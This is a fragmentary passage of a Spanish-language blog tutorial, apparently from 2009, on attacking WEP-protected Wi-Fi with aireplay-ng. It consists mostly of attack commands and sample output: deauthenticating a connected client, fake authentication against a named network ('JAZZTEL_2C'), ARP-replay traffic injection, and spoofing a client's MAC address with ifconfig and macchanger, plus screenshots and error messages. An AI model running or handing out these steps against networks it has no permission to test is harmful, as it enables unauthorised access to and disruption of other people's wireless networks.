...
16:35:29  Association successful :-) (AID: 1)</pre>
...
<pre class="code">aireplay-ng -3 -b 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0</pre>
...
<pre class="code">ifconfig ath0 | grep HWaddr</pre>
...
<p>[caption id="attachment_327" align="aligncenter" width="461" caption="Inyección de tráfico con aireplay-ng"]<a rel="lightbox" href="http://racotecnic.underave.net/wp-content/uploads/2009/03/aireplay-ng.png"><img class="size-full wp-image-327" title="aireplay-ng" src="http://racotecnic.underave.net/wp-content/uploads/2009/03/aireplay-ng.png" alt="aireplay-ng" width="461" height="60" /></a>[/caption]</p>
<p>Si estamos atacando utilizando la mac de un STATION en lugar de la nuestra, nos aparecerá este error:</p>
<pre class="code">The interface MAC (06:19:5B:C9:F2:4A) doesn't match the specified MAC (-h).
	ifconfig ath0 hw ether 00:16:CB:BA:23:D2</pre>
...
<pre class="code">aireplay-ng -0 5 -a 00:09:5B:D7:43:A8 -c 00:11:22:33:44:55
aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h 00:11:22:33:44:55</pre>
...
<pre class="code">ifconfig ath0 hw ether 00:16:CB:BA:23:D2</pre>
<p>La otra es utilizar macchanger:</p>
<pre class="code"><span style="color: #888888;">#INSTALAMOS MACCHANGER</span>
...
<p>[caption id="attachment_332" align="aligncenter" width="561" caption="aireplay-ng enviando paquetes"]<a rel="lightbox" href="http://racotecnic.underave.net/wp-content/uploads/2009/03/aireplay-ng_sending.png"><img class="size-full wp-image-332" title="aireplay-ng_sending" src="http://racotecnic.underave.net/wp-content/uploads/2009/03/aireplay-ng_sending.png" alt="aireplay-ng enviando paquetes" width="561" height="60" /></a>[/caption]</p>
...
<pre class="code">Notice: got a deauth/disassoc packet. Is the source MAC associated ?</pre>
...
<pre class="code">aireplay-ng -1 0 -e JAZZTEL_2C -a 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0</pre>
